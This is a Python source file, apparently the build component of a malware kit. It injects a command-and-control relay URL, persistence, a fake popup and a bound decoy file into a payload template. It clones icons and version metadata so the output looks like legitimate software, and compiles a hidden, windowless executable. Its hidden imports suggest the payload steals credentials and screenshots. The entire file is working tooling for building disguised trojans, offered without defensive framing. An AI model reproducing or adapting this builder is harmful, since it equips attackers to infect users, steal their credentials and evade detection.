# builder.py (Full Code - Revamped for Unified/Stable Payload)
import os
import subprocess
import shutil
import tempfile
import sys
import base64
import json
import psutil
from pyinstaller_versionfile import create_versionfile
try:
    import win32file, win32con, win32api, win32security, pywintypes
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False

def simple_log_filter(line, state):
    line_strip = line.strip(); line_lower = line_strip.lower()
    log_map = { "pyinstaller bootloader": ("[PyInstaller] Starting executable conversion...", "pyinstaller_start"), "analyzing hidden import": ("[PyInstaller] Analyzing hidden imports...", "hidden_imports"), "including run-time hook": ("[PyInstaller] Including run-time hooks...", "runtime_hooks"), "building c archive": ("[Compiler] Compiling support libraries...", "compiling_c"), "building exe from": ("[Compiler] Compiling main executable...", "compiling_exe"), "appending archive to exe": ("[Bundler] Bundling payload into a single file...", "bundling")}
    for keyword, (message, state_key) in log_map.items():
        if keyword in line_lower and not state.get(state_key):
            state[state_key] = True; return message
    if "pyinstaller:" in line_lower and not state.get("pyi_version"):
        state["pyi_version"] = True; return f"[PyInstaller] v{line_strip.split(':')[-1].strip()}"
    if "python:" in line_lower and not state.get("python_version"):
        state["python_version"] = True; return f"[Python] v{line_strip.split(':')[-1].strip()}"
    if line_strip.startswith('WARN:'): return f"[Warning] {line_strip[5:].strip()}"
    return None

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
    log_callback(f"\n[Builder] Starting build for payload: {main_payload_full_name}...")
    
    final_path = _compile_single(
        main_payload_full_name, settings, relay_url, c2_user, 
        log_callback, thread_object
    )

    if not final_path:
        log_callback(f"[ERROR] Failed to build main payload. Aborting.")
        return None

    log_callback("\n[Builder] Build process completed successfully.")
    return thread_object.proc

def _compile_single(payload_full_name, settings, relay_url, c2_user, log_callback, thread_object):
    with tempfile.TemporaryDirectory() as temp_dir:
        pyinstaller_name = os.path.splitext(payload_full_name)[0]
        temp_script_path = os.path.join(temp_dir, f"temp_{pyinstaller_name}.py")
        
        template_path = "payload/template.py"
        with open(template_path, "r", encoding="utf-8") as f: code = f.read()
        
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(settings.get("persistence", False)))
        code = code.replace("{{RELAY_URL}}", f"'{relay_url}'")
        code = code.replace("{{C2_USER}}", f"'{c2_user}'")
        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "")))
        
        decoy_filename = "''"; decoy_data_b64 = "''"; bind_path = settings.get("bind_path")
        if bind_path and os.path.exists(bind_path):
            decoy_filename = f"'{os.path.basename(bind_path)}'";
            with open(bind_path, 'rb') as f: decoy_data_b64 = f"'{base64.b64encode(f.read()).decode()}'"
        code = code.replace("{{DECOY_ENABLED}}", str(bool(bind_path)))
        code = code.replace("{{DECOY_FILENAME}}", decoy_filename)
        code = code.replace("{{DECOY_DATA_B64}}", decoy_data_b64)
        
        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
        
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', pyinstaller_name]
        cloning_settings = settings.get("cloning", {})
        if cloning_settings.get("enabled"):
            if cloning_settings.get("icon") and os.path.exists(cloning_settings["icon"]):
                command.extend(['--icon', cloning_settings["icon"]])
            version_file_path = os.path.join(temp_dir, "version.txt")
            create_versionfile(
                output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"),
                company_name=cloning_settings["version_info"].get("CompanyName", ""), file_description=cloning_settings["version_info"].get("FileDescription", ""),
                internal_name=cloning_settings["version_info"].get("OriginalFilename", ""), legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""),
                original_filename=cloning_settings["version_info"].get("OriginalFilename", ""), product_name=cloning_settings["version_info"].get("ProductName", "")
            )
            command.extend(['--version-file', version_file_path])

        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'PIL', 'winreg', 'shutil', 'sqlite3', 'ctypes', 'socket', 'cryptography', 'xml.etree.ElementTree', 'zipfile']
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        thread_object.proc = process
        
        log_state = {}
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running: break
            simple_msg = simple_log_filter(line, log_state)
            if simple_msg: log_callback(simple_msg)
        
        process.wait()
        
        if process.returncode == 0 and thread_object._is_running:
            built_exe_path = os.path.join(temp_dir, 'dist', f"{pyinstaller_name}.exe")
            output_dir = "output";
            if not os.path.exists(output_dir): os.makedirs(output_dir)

            final_exe_path = os.path.join(output_dir, payload_full_name)
            shutil.move(built_exe_path, final_exe_path)
            
            log_callback(f"[Success] '{payload_full_name}' saved to output folder.")
            log_callback(f"[Location] {os.path.abspath(final_exe_path)}")
            return final_exe_path
        elif thread_object._is_running:
            log_callback(f"[ERROR] PyInstaller failed for '{pyinstaller_name}' with code {process.returncode}.")
            return None
        return None